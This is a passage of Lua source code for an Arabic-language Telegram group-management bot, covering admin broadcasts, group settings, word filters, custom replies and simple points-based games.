if redis:get(bot_id.."Hadaf:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء الاذاعه خاص") 
redis:del(bot_id.."Hadaf:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id..'Hadaf:Num:User:Pv')  
send(msg.chat_id_, msg.id_,"✅┇تمت الاذاعه الى *- "..#list.." * مشترك في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
redis:del(bot_id.."Hadaf:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء الاذاعه للمجموعات") 
redis:del(bot_id.."Hadaf:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id.."Hadaf:ChekBotAdd") 
send(msg.chat_id_, msg.id_,"✅┇تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
redis:del(bot_id.."Hadaf:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء الاذاعه بالتوجيه للمجموعات") 
redis:del(bot_id.."Hadaf:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = redis:smembers(bot_id.."Hadaf:ChekBotAdd")   
send(msg.chat_id_, msg.id_,"✅┇تم التوجيه الى *- "..#list.." * مجموعه في البوت ")     
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
redis:del(bot_id.."Hadaf:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء الاذاعه بالترجيه خاص") 
redis:del(bot_id.."Hadaf:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = redis:smembers(bot_id.."Hadaf:Num:User:Pv")   
send(msg.chat_id_, msg.id_,"✅┇تم التوجيه الى *- "..#list.." * مجموعه في البوت ")     
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
redis:del(bot_id.."Hadaf:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == "الغاء" then 
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء امر تغيير وصف المجموعه") 
redis:del(bot_id.."Hadaf:Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
redis:del(bot_id.."Hadaf:Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request("https://api.telegram.org/bot"..token.."/setChatDescription?chat_id="..msg.chat_id_.."&description="..text) 
send(msg.chat_id_, msg.id_,"✅┇تم تغيير وصف المجموعه")   
return false  
end 
--------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء امر حفظ الترحيب") 
redis:del(bot_id.."Hadaf:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Hadaf:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
redis:set(bot_id.."Hadaf:Get:Welcome:Group"..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"✅┇تم حفظ ترحيب المجموعه")   
return false   
end
--------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:link:set"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء امر حفظ الرابط") 
redis:del(bot_id.."Hadaf:link:set"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
redis:set(bot_id.."Hadaf:link:set:Group"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"✅┇تم حفظ الرابط بنجاح")       
redis:del(bot_id.."Hadaf:link:set"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
------------------------------------------------------------------------------------------------------------
if text and not Vips(msg) then  
local Text_Filter = redis:get(bot_id.."Hadaf:Filter:Reply2"..text..msg.chat_id_)   
if Text_Filter then    
Send_Options(msg,msg.sender_user_id_,"reply","📬┇"..Text_Filter)  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Change:Name:Bot"..msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء امر تغيير اسم البوت") 
redis:del(bot_id.."Hadaf:Change:Name:Bot"..msg.sender_user_id_) 
return false  
end 
redis:del(bot_id.."Hadaf:Change:Name:Bot"..msg.sender_user_id_) 
redis:set(bot_id.."Hadaf:Redis:Name:Bot",text) 
send(msg.chat_id_, msg.id_, "✅┇ تم تغيير اسم البوت الى - "..text)  
return false
end 
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء امر اضافة صلاحيه") 
local CmdDel = redis:get(bot_id.."Hadaf:Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
redis:del(bot_id.."Hadaf:Add:Validity:Group:Rt"..CmdDel..msg.chat_id_)
redis:srem(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_,CmdDel)  
redis:del(bot_id.."Hadaf:Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_,"\n💢┇الاستخدام خطا رتبتك اقل من منشئ \n⚠️️┇تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز  ، ادمن }") 
return false
end
end
if text == "ادمن" then
if not Owner(msg) then 
send(msg.chat_id_, msg.id_,"\n💢┇الاستخدام خطا رتبتك اقل من مدير \n⚠️️┇تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز }") 
return false
end
end
if text == "مميز" then
if not Admin(msg) then
send(msg.chat_id_, msg.id_,"\n💢┇الاستخدام خطا رتبتك اقل من ادمن \n⚠️️┇تستطيع اضافة صلاحيات الاتيه فقط ← { عضو }") 
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = redis:get(bot_id.."Hadaf:Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
redis:set(bot_id.."Hadaf:Add:Validity:Group:Rt"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, "\n📮┇تم اضافة الصلاحيه باسم ← { "..textn..' }') 
redis:del(bot_id.."Hadaf:Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء امر تعيين الايدي") 
redis:del(bot_id.."Hadaf:Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
redis:del(bot_id.."Hadaf:Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) 
redis:set(bot_id.."Hadaf:Set:Id:Group"..msg.chat_id_,text:match("(.*)"))
send(msg.chat_id_, msg.id_,'✅┇تم تعيين الايدي الجديد')    
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Hadaf:Random:Sm"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Hadaf:Set:Sma"..msg.chat_id_) then
if not redis:get(bot_id.."Hadaf:Set:Sma"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اذا كنت تريد اللعب مره اخرى ارسل - سمايل او سمايلات")
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Hadaf:Set:Sma"..msg.chat_id_,true)
return false
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Hadaf:Klam:Speed"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Hadaf:Speed:Tr"..msg.chat_id_) then
if not redis:get(bot_id.."Hadaf:Speed:Tr"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اذا كنت تريد اللعب مره اخرى ارسل - الاسرع")
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Hadaf:Speed:Tr"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Hadaf:Klam:Hzor"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Hadaf:Set:Hzora"..msg.chat_id_) then
if not redis:get(bot_id.."Hadaf:Set:Hzora"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اذا كنت تريد اللعب مره اخرى ارسل - حزوره")
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Hadaf:Set:Hzora"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Hadaf:Maany"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Hadaf:Set:Maany"..msg.chat_id_) then
if not redis:get(bot_id.."Hadaf:Set:Maany"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اذا كنت تريد اللعب مره اخرى ارسل - معاني")
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Hadaf:Set:Maany"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Hadaf:Set:Aks:Game"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Hadaf:Set:Aks"..msg.chat_id_) then
if not redis:get(bot_id.."Hadaf:Set:Aks"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اذا كنت تريد اللعب مره اخرى ارسل - العكس")
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Hadaf:Set:Aks"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"📬┇عذرًا لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n")
return false  end 
local GETNUM = redis:get(bot_id.."Hadaf:GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id.."Hadaf:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
redis:del(bot_id.."Hadaf:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,5)  
send(msg.chat_id_, msg.id_,"🔖┇مبروك فزت معنا وخمنت الرقم الصحيح\n🚸┇تم اضافة { 5 } من النقاط \n")
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:incrby(bot_id.."Hadaf:SADD:NUM"..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(redis:get(bot_id.."Hadaf:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)) >= 3 then
redis:del(bot_id.."Hadaf:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
redis:del(bot_id.."Hadaf:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"📮┇لقد خسرت في اللعبه \n📬┇حظًا اوفر في المره القادمه \n🔰┇كان الرقم الذي تم تخمينه { "..GETNUM.." }")
else
send(msg.chat_id_, msg.id_,"📛┇تخمينك غير صحيح \n📌┇ارسل رقم تخمين مره اخرى ")
end
end
end
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"📬┇عذرًا لا يوجد سوى { 6 } اختيارات فقط ارسل اختيارك مره اخرى\n")
return false  end 
local GETNUM = redis:get(bot_id.."Hadaf:Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id.."Hadaf:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"📮┇مبروك فزت وطلعت المحيبس باليد رقم { "..NUM.." }\n🎊┇لقد حصلت على { 3 }من النقاط")
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,3)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:del(bot_id.."Hadaf:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"📮┇للاسف لقد خسرت \n📬┇المحيبس باليد رقم { "..GETNUM.." }\n💥┇حاول مره اخرى للعثور على المحيبس")
end
end
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Hadaf::Set:Moktlf"..msg.chat_id_) or "").."" then 
if not redis:get(bot_id.."Hadaf:Set:Moktlf:Bot"..msg.chat_id_) then 
redis:del(bot_id.."Hadaf::Set:Moktlf"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اذا كنت تريد اللعب مره اخرى ارسل - المختلف")
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Hadaf:Set:Moktlf:Bot"..msg.chat_id_,true)
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Hadaf:Set:Amth"..msg.chat_id_) or "").."" then 
if not redis:get(bot_id.."Hadaf:Set:Amth:Bot"..msg.chat_id_) then 
redis:del(bot_id.."Hadaf:Set:Amth"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اذا كنت تريد اللعب مره اخرى ارسل - امثله")
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Hadaf:Set:Amth:Bot"..msg.chat_id_,true)
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
redis:del(bot_id.."Hadaf:id:user"..msg.chat_id_)  
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء امر اضافة رسائل") 
redis:del(bot_id.."Hadaf:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Hadaf:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = redis:get(bot_id.."Hadaf:id:user"..msg.chat_id_)  
redis:del(bot_id.."Hadaf:Msg_User"..msg.chat_id_..":"..msg.sender_user_id_) 
redis:incrby(bot_id.."Hadaf:Num:Message:User"..msg.chat_id_..":"..iduserr,numadded)  
send(msg.chat_id_,msg.id_,"\n📨┇تم اضافة له - "..numadded.." رسائل")  
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
redis:del(bot_id.."Hadaf:idgem:user"..msg.chat_id_)  
send(msg.chat_id_,msg.id_, "\n⚠️️┇تم الغاء امر اضافة نقاط") 
redis:del(bot_id.."Hadaf:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Hadaf:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = redis:get(bot_id.."Hadaf:idgem:user"..msg.chat_id_)  
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_,msg.id_,"\n💎┇تم اضافة له - "..numadded.." نقاط")  
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_, msg.id_, "⚠️️┇تم الغاء حفظ القوانين") 
redis:del(bot_id.."Hadaf:Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
redis:set(bot_id.."Hadaf::Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"📮┇تم حفظ قوانين المجموعه") 
redis:del(bot_id.."Hadaf:Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
------------------------------------------------------------------------------------------------------------
if text then 
local DelFilter = redis:get(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if DelFilter and DelFilter == "DelFilter" then   
send(msg.chat_id_, msg.id_,"📮┇تم الغاء منعها")  
redis:del(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
redis:del(bot_id.."Hadaf:Filter:Reply2"..text..msg.chat_id_)  
redis:srem(bot_id.."Hadaf:List:Filter"..msg.chat_id_,text)  
return false  end  
end
------------------------------------------------------------------------------------------------------------
if text then   
local SetFilter = redis:get(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if SetFilter and SetFilter == "SetFilter" then   
send(msg.chat_id_, msg.id_,"📫┇ارسل التحذير عند ارسال الكلمه")  
redis:set(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_,"WirngFilter")  
redis:set(bot_id.."Hadaf:Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_, text)  
redis:sadd(bot_id.."Hadaf:List:Filter"..msg.chat_id_,text)  
return false  
end  
end
------------------------------------------------------------------------------------------------------------
if text then  
local WirngFilter = redis:get(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if WirngFilter and WirngFilter == "WirngFilter" then  
send(msg.chat_id_, msg.id_,"🔖┇تم منع الكلمه مع التحذير")  
redis:del(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
local test = redis:get(bot_id.."Hadaf:Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_)  
if text then   
redis:set(bot_id.."Hadaf:Filter:Reply2"..test..msg.chat_id_, text)  
end  
redis:del(bot_id.."Hadaf:Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id..'Hadaf:GetTexting:DevHadaf'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' or text == 'الغاء ✖' then 
redis:del(bot_id..'Hadaf:GetTexting:DevHadaf'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'⚠️️┇تم الغاء حفظ كليشة المطور')
return false
end
redis:set(bot_id..'Hadaf:Texting:DevHadaf',text)
redis:del(bot_id..'Hadaf:GetTexting:DevHadaf'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'✅┇تم حفظ كليشة المطور')
send(msg.chat_id_,msg.id_,text)
return false
end
------------------------------------------------------------------------------------------------------------
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = redis:get(bot_id.."Hadaf:Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_.."")
if redis:get(bot_id.."Hadaf:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
redis:del(bot_id.."Hadaf:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
redis:set(bot_id.."Hadaf:Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
redis:set(bot_id.."Hadaf:Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
redis:set(bot_id.."Hadaf:Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."Hadaf:Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
redis:set(bot_id.."Hadaf:Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
redis:set(bot_id.."Hadaf:Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
redis:set(bot_id.."Hadaf:Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
redis:set(bot_id.."Hadaf:Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"📌┇تم حفظ الرد بنجاح \n⚠️️┇ارسل ( "..test.." ) لرؤية الرد")
return false  
end  
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Hadaf:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n⚠️️┇ارسل لي الرد لاضافته\n🔖┇تستطيع اضافة ← { ملف ، فديو ، نص ، ملصق ، بصمه ، متحركه }\n📬┇تستطيع ايضا اضافة :\n👤┇`#username` » معرف المستخدم \n📨┇`#msgs` » عدد الرسائل\n👤┇`#name` » اسم المستخدم\n🚸┇`#id` » ايدي المستخدم\n📮┇`#stast` » موقع المستخدم \n📝┇`#edit` » عدد التعديلات ')
redis:set(bot_id.."Hadaf:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
redis:set(bot_id.."Hadaf:Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Text"..text..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Photo"..text..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Video"..text..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:File"..text..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Audio"..text..msg.chat_id_)
redis:sadd(bot_id.."Hadaf:List:Manager"..msg.chat_id_.."", text)
return false end
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Hadaf:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"✅┇تم حذف الرد من الردود")
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Text"..text..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Photo"..text..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Video"..text..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:File"..text..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Audio"..text..msg.chat_id_)
redis:del(bot_id.."Hadaf:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
redis:srem(bot_id.."Hadaf:List:Manager"..msg.chat_id_.."", text)
return false
end
end
------------------------------------------------------------------------------------------------------------
if text and not redis:get(bot_id.."Hadaf:Reply:Manager"..msg.chat_id_) then
if not redis:sismember(bot_id..'Hadaf:Spam_For_Bot'..msg.sender_user_id_,text) then
local anemi = redis:get(bot_id.."Hadaf:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = redis:get(bot_id.."Hadaf:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = redis:get(bot_id.."Hadaf:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local Text = redis:get(bot_id.."Hadaf:Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = redis:get(bot_id.."Hadaf:Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = redis:get(bot_id.."Hadaf:Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = redis:get(bot_id.."Hadaf:Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = redis:get(bot_id.."Hadaf:Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = redis:get(bot_id..'Hadaf:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
